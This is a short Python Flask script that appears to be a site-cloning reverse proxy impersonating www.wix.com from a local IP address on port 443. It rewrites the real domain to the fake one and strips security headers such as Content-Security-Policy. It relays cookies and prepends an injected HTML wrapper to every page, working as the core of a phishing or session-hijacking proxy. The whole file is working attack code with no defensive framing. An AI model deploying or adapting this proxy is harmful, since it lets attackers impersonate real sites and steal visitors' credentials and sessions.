from flask import Flask,request,make_response
import requests
import base64
import re
from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

app = Flask(__name__)
HTTP_METHODS = ['GET', 'HEAD', 'POST', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH']

def make_request(method, url, headers, post_data = None, retries = 3):
	if method not in ['GET', 'POST']:
		raise Exception("unsupported method")
	counter = 0
	while counter < retries:
		try:
			if method == 'GET':
				return requests.get(url, headers=headers, allow_redirects=True, verify=False)
			elif method == "POST":
				return requests.post(url, headers=headers, data=post_data, allow_redirects=True, verify=False)
		except:
			print(">>>>>>>>>>>>>>> ERROR, repeating.... ERRURL = " + url, flush=True)
			counter += 1
			
@app.before_request
def main():
	fakeDomain = "192.168.1.208"
	domain = "www.wix.com"
	baseUrl = "https://"+domain
	path = "demone2/phone-and-tablet"
	url = request.args.get("_URL_")
	if url:
		url = url.replace(fakeDomain, domain)
		if domain not in url:
			url = f"{baseUrl}/{url}"
	else:	
		url = baseUrl + "/" + (request.path if request.path else path)
		query = request.query_string.decode("utf8")
		if query:
			url += "?" + query

	headers = {}
	for header in request.headers:
		k, v = header
		if k.lower() not in ['connection', 'host']:
			headers[k] = v
	headers['Origin'] = baseUrl

	response = make_request(request.method, url, headers, request.data)
	data = response.content
	rtype = response.headers['content-type']
	print("URL (orig) = "+request.full_path + "\n" + "URL (repl) = "+url + "\n" + "URL (code) = "+str(response.status_code)+"\n", flush=True)

	if 'text' in rtype or 'application/javascript' in rtype:
		data = data.decode("utf8")
		data = data.replace(domain, fakeDomain)
		# escaping and cookies
		#data = re.sub("\"(https\:\/\/.*)\"", "\"https://" + fakeDomain + "?_URL_=\g<1>\"", data)
		data = data.encode("utf8")
	if 'text/html' in rtype and not ".js" in url:
		wrapper = open("/root/Desktop/copier/inject.html").read() \
			.replace('{HTML}', base64.b64encode(data).decode("utf8")) \
			.replace('{DOMAIN_ORIG}', domain) \
			.replace('{DOMAIN_FAKE}', fakeDomain)
		# first - wrapper, after - original content
		data = wrapper + data.decode("utf8")

	responseFake = make_response(data)
	for header in response.headers:
		if header.lower() not in ['content-length', 'content-encoding', 'content-security-policy', 'cross-origin-opener-policy', 'set-cookie']:
			responseFake.headers[header] = response.headers[header]
	responseFake.headers['Access-Control-Allow-Origin'] = '*'

	for cookie in response.cookies:
		responseFake.set_cookie(cookie.name, cookie.value)

	#print(responseFake.headers['content-type'], flush=True)
	#print(responseFake.headers, flush=True)
	return responseFake

app.run(host='0.0.0.0', port=443, debug=True, ssl_context=('/root/Desktop/copier/cert.pem', '/root/Desktop/copier/key.pem'))